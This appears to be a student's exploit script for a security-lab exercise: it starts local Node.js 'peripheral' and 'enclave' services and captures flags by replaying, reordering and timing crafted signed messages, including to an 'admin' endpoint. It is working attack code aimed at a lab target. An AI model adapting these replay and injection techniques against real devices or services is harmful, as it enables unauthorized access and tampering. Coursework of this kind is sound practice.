#from cryptodome import *
import os
import subprocess
import signal
from time import sleep
import code
import select
import time
import requests
from requests.exceptions import ConnectionError
import random

path = "/home/isl/t2/"
node_prefix = ""
#path = "/mnt/hgfs/VMwareMain/ETH/Lab/Module4/Task2/"
#node_prefix = "/home/toroto006/Downloads/node-v16.13.0-linux-x64/bin/"

enclave_uri = "http://127.0.0.1:37100"
peripheral_uri = "http://127.0.0.1:37200"
rand_it = ""

def cleanUp():
    os.system("pkill -9 node")

def setup(with_catching=True) -> subprocess.Popen:
    if with_catching:
        P = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}peripheral"], stdin=subprocess.PIPE,  stdout=subprocess.PIPE)
        E = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}enclave"], stdin=subprocess.PIPE,  stdout=subprocess.PIPE)
    else:
        P = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}peripheral"])
        E = subprocess.Popen([f"{node_prefix}node", "--no-warnings", f"{path}enclave"])
    sleep(1)
    print("Setup done, let's now do the request")
    return P, E

def readuntil(w, s, name):
    line = ""
    while s not in line:
        line = w.stdout.readline().decode().rstrip()
        print(f"{name}<{line}")
    return s

def injectHello(P):
    # flag2-3
    readuntil(P, "Store takes some time", "PwaitS")
    # 1636560351705$00
    ts = str(int(time.time()*1000))+"$00"
    assert len(ts) == 16
    msg = f'hello$0000000000{ts}0389289a839f8104a19535a57c60be21c2da9312df51308e0cd363ba82885b51111111111111111111111111111111112880ccda64f655478e053e178a2b4caf3441570c37c51e5eddeb4fd3f5a15d94653de7101e9c59229b666124029fc7d2dbf080223cc1e27635e9ea1f374e44bf86208d23fe97661d97ed63d5b1585afed679e7d2855f55d403e71c50ebe0390207d926be16293d3d2aa55e6ea6d9f013'
    assert len(msg) == 352
    headers = {
        'Content-Type': 'application/xml',
        'Content-Length': '352'
        }
    try:
        rep = requests.post(f"{peripheral_uri}/hello", data=msg, headers=headers)
        if rep.status_code == 200:
            print(f"P req returned {rep.text}")
        else:
            print(f"P got {rep}")
    except ConnectionError:
        print("ERROR: An error occurred")

def flag2_3():
    cleanUp()
    P, E = setup()
    # Exploit
    injectHello(P)

def injectRand(uri):
    # Just try random stuff?
    global rand_it
    ts = str(int(time.time()*1000))+"$00"
    msg_arr = [
        (f'gets$00000000000{ts}11434d9f6277a8dcf01ba29124a24c7fcad984da0feb3190ed8b19fced10385a111111111111111111111111111111112880ccda64f655478e053e178a2b4cafbb53d6f4e3d6208f387806d7fdd1b29d1ef0d44c78d3f67d087385cc23e857792c42ab947b9925bb962c44ce19571c245cedc1efaf00e4e745773ec52a8de4baaa3ea5f7b11113987c0c8283a400c30e9cc7e30a72efae130bb7369a9e391735', 'gets'),
        (f'hello$0000000000{ts}0389289a839f8104a19535a57c60be21c2da9312df51308e0cd363ba82885b51111111111111111111111111111111112880ccda64f655478e053e178a2b4caf3441570c37c51e5eddeb4fd3f5a15d94653de7101e9c59229b666124029fc7d2dbf080223cc1e27635e9ea1f374e44bf86208d23fe97661d97ed63d5b1585afed679e7d2855f55d403e71c50ebe0390207d926be16293d3d2aa55e6ea6d9f013', 'hello'),
        (f'puts$00000000000{ts}f582ac4a4626f490eda87fbf7b71ed53b7be4edba7771f6fe3d4f217817edf97111111111111111111111111111111112880ccda64f655478e053e178a2b4caf5ab5613f182e0310a604d2451107c7735c682dffb0d47fa1dc929e05270e2a0c76e12f608f04c8908e79496cd265078c6336ca1698fda2b310a5b3c8c2e3f7709b4716ebddbec25957f5a61ed1edcea22a2f4c7cd00c4e29844b71bd07760207', 'puts'),
        (f'store$0000000000{ts}16fd8ebd2e696dc2323d83ce491aafa0d63f74a40ea31f924159d041837955a2111111111111111111111111111111112880ccda64f655478e053e178a2b4cafda230f5afde3a2b3e0b8b1fab8932fb5f92247f1a61e1ff48c154a7d889c8a90230a7c1edede1ef3db4d4614116d152ba252906ad668420f46e3321f294cc29272e39c5d99004d5cd4fd63b148c87970f5ae3ddce9d30afa66298b53b414b316', 'store'),
        (f'hi$0000000000000{ts}7fc187ee95e286625e037734292d5dcb9d0c3b3a8695cb5e483818b825f9e1f8111111111111111111111111111111112880ccda64f655478e053e178a2b4caf93191fcf93e111309e7d249f8ccc0245a91da8ea968d7e56afda23d92484581df4404dfdad84e177c7768eb995b90f3eb17882def7af94252f5794e2b121b6f6b45b6788835bf16fab622160b680ee030078c2740e458329593943535f1348e5', 'hi'),
        (f'admin$0000000000{ts}3575c066c711913e0b95b65aa1a9810c4726af722fc9a27974845a36ffb5aa4011111111111111111111111111111111af4a445d5bfee31c1fba656aefb089f112117264ee42ae55001f1d1a3bc561787439810809ab69fa140077db71232044813b626b53623b6d1a2fbc22f65f12eadfb7a4bc563719c11e063b744f5f91f9c412272ce5af58fbeace9d7862a3c1de8cbb695293a6fe76bf77e9493ad8eab1', 'admin'),
    ]

    r_msg_idx = random.randrange(0,len(msg_arr))
    r_msg, r_api = msg_arr[r_msg_idx]
    assert len(r_msg) == 352
    headers = {
        'Content-Type': 'application/xml',
        'Content-Length': '352'
        }
    if "37100" in uri:
        name = "E"
    else:
        name = "P"
    try:
        rep = requests.post(f"{uri}/{r_api}", data=r_msg, headers=headers)
        rand_it += f"{name}/{r_msg_idx};"
        if rep.status_code == 200:
            print(f"{name}<{rep.text.rstrip()}")
        elif rep.status_code == 404:
            return
        else:
            print(f"{name} ERROR: {rep}")
    except ConnectionError:
        print("ERROR: An error occurred")

def injectRandTwoFlags():
    # Does work for timing (3) and reorder (2)
    known_working = "P/0;P/2;P/3;P/0;P/4;P/0;P/0;P/4;P/0;P/1;P/5;P/4;P/1;P/3;P/1;P/3;P/0;P/0;P/5;P/4;P/0;P/2;P/3;P/1;P/3;P/0;P/4;P/5;P/5;P/1;P/4;P/0;P/4;P/3;P/0;P/3;P/2;P/1;P/1;P/4;P/0;P/1;P/2;P/4;P/5;P/3;P/0;P/4;P/4;P/5;P/2;P/0;P/0;P/0;P/3;P/0;P/1;P/2;P/2;P/2;P/4;P/4;P/5;P/1;P/2;P/2;P/1;P/2;P/3;P/2;P/4;P/0;P/5;P/0;P/3;P/5;P/0;P/4;P/2;P/3;P/5;P/4;P/0;P/0;P/0;P/5;P/0;P/5;P/2;P/3;P/5;P/2;P/2;P/1;P/3;P/5;P/3;P/2;P/2;P/3;P/2;P/3;P/1;P/3;P/3;P/4;P/4;P/0;P/4;".split(';')[:-1]
    for step in known_working:
        who, what = step.split('/')
        if "P" in who:
            uri = peripheral_uri
        else:
            uri = enclave_uri
        ts = str(int(time.time()*1000))+"$00"
        msg_arr = [
            (f'gets$00000000000{ts}11434d9f6277a8dcf01ba29124a24c7fcad984da0feb3190ed8b19fced10385a111111111111111111111111111111112880ccda64f655478e053e178a2b4cafbb53d6f4e3d6208f387806d7fdd1b29d1ef0d44c78d3f67d087385cc23e857792c42ab947b9925bb962c44ce19571c245cedc1efaf00e4e745773ec52a8de4baaa3ea5f7b11113987c0c8283a400c30e9cc7e30a72efae130bb7369a9e391735', 'gets'),
            (f'hello$0000000000{ts}0389289a839f8104a19535a57c60be21c2da9312df51308e0cd363ba82885b51111111111111111111111111111111112880ccda64f655478e053e178a2b4caf3441570c37c51e5eddeb4fd3f5a15d94653de7101e9c59229b666124029fc7d2dbf080223cc1e27635e9ea1f374e44bf86208d23fe97661d97ed63d5b1585afed679e7d2855f55d403e71c50ebe0390207d926be16293d3d2aa55e6ea6d9f013', 'hello'),
            (f'puts$00000000000{ts}f582ac4a4626f490eda87fbf7b71ed53b7be4edba7771f6fe3d4f217817edf97111111111111111111111111111111112880ccda64f655478e053e178a2b4caf5ab5613f182e0310a604d2451107c7735c682dffb0d47fa1dc929e05270e2a0c76e12f608f04c8908e79496cd265078c6336ca1698fda2b310a5b3c8c2e3f7709b4716ebddbec25957f5a61ed1edcea22a2f4c7cd00c4e29844b71bd07760207', 'puts'),
            (f'store$0000000000{ts}16fd8ebd2e696dc2323d83ce491aafa0d63f74a40ea31f924159d041837955a2111111111111111111111111111111112880ccda64f655478e053e178a2b4cafda230f5afde3a2b3e0b8b1fab8932fb5f92247f1a61e1ff48c154a7d889c8a90230a7c1edede1ef3db4d4614116d152ba252906ad668420f46e3321f294cc29272e39c5d99004d5cd4fd63b148c87970f5ae3ddce9d30afa66298b53b414b316', 'store'),
            (f'store$0000000000{ts}2878b97f22115c59fbb3fb4b41564a6da24ecc24c48796195c1e42d5d0e5c7ae111111111111111111111111111111112880ccda64f655478e053e178a2b4cafda230f5afde3a2b3e0b8b1fab8932fb5a31a8733254af8eb083fd31fe7a10c364799ac5800ba50b75b32e01b2766953658320f6d1e4d99487824ae501104f85ce6a467afd899cdea1a7d091a1572e0d7f8e9c7906ba8fa066517fa3c167dce4f', 'store'),
            (f'hi$0000000000000{ts}7fc187ee95e286625e037734292d5dcb9d0c3b3a8695cb5e483818b825f9e1f8111111111111111111111111111111112880ccda64f655478e053e178a2b4caf93191fcf93e111309e7d249f8ccc0245a91da8ea968d7e56afda23d92484581df4404dfdad84e177c7768eb995b90f3eb17882def7af94252f5794e2b121b6f6b45b6788835bf16fab622160b680ee030078c2740e458329593943535f1348e5', 'hi'),
            (f'admin$0000000000{ts}3575c066c711913e0b95b65aa1a9810c4726af722fc9a27974845a36ffb5aa4011111111111111111111111111111111af4a445d5bfee31c1fba656aefb089f112117264ee42ae55001f1d1a3bc561787439810809ab69fa140077db71232044813b626b53623b6d1a2fbc22f65f12eadfb7a4bc563719c11e063b744f5f91f9c412272ce5af58fbeace9d7862a3c1de8cbb695293a6fe76bf77e9493ad8eab1', 'admin'),
        ]
        msg, api = msg_arr[int(what)]
        headers = {
        'Content-Type': 'application/xml',
        'Content-Length': '352'
        }
        try:
            rep = requests.post(f"{uri}/{api}", data=msg, headers=headers)
            if rep.status_code == 200:
                pass
                #print(f"{who}<{rep.text.rstrip()}")
            elif rep.status_code ==404:
                pass
            else:
                pass
                #print(f"{who} ERROR: {rep}")
        except ConnectionError:
            print("ERROR: An error occurred")
        sleep(0.05)

def flag2_2():
    cleanUp()
    P, E = setup(with_catching=False)
    # Exploit
    for i in range(10):
        ts = str(int(time.time()*1000))+"$00"
        msgs = [
            (f'store$0000000000{ts}2878b97f22115c59fbb3fb4b41564a6da24ecc24c48796195c1e42d5d0e5c7ae111111111111111111111111111111112880ccda64f655478e053e178a2b4cafda230f5afde3a2b3e0b8b1fab8932fb5a31a8733254af8eb083fd31fe7a10c364799ac5800ba50b75b32e01b2766953658320f6d1e4d99487824ae501104f85ce6a467afd899cdea1a7d091a1572e0d7f8e9c7906ba8fa066517fa3c167dce4f', 'store'),
            (f'store$0000000000{ts}16fd8ebd2e696dc2323d83ce491aafa0d63f74a40ea31f924159d041837955a2111111111111111111111111111111112880ccda64f655478e053e178a2b4cafda230f5afde3a2b3e0b8b1fab8932fb5f92247f1a61e1ff48c154a7d889c8a90230a7c1edede1ef3db4d4614116d152ba252906ad668420f46e3321f294cc29272e39c5d99004d5cd4fd63b148c87970f5ae3ddce9d30afa66298b53b414b316', 'store')
        ]
        for msg, api in msgs:
            headers = {
            'Content-Type': 'application/xml',
            'Content-Length': '352'
            }
            try:
                rep = requests.post(f"{peripheral_uri}/{api}", data=msg, headers=headers)
                if rep.status_code == 200:
                    print(f"P<{rep.text.rstrip()}")
                elif rep.status_code == 404:
                    print(f"ERROR {rep}")
                else:
                    pass
                    #print(f"{who} ERROR: {rep}")
            except ConnectionError:
                print("ERROR: An error occurred")
        sleep(0.1)

def main():
    #cleanUp()
    #P, E = setup(with_catching=False)
    # Exploit
    flag2_2()
    flag2_3()
    return
    for i in range(150):
        injectRand(peripheral_uri)
        #injectRand(enclave_uri)
        sleep(0.05)
    #readuntil(E, "Enclave connected", "E")
    print(rand_it)

if __name__ == "__main__":
    cleanUp()
    try:
        main()
    except Exception as e:
        print(e)
        print(f"An error occured in main!")
    finally:
        cleanUp()
    os.system("cd /home/isl/t2 && /home/isl/t2/run.sh")
    print("Exploit done")
    exit()
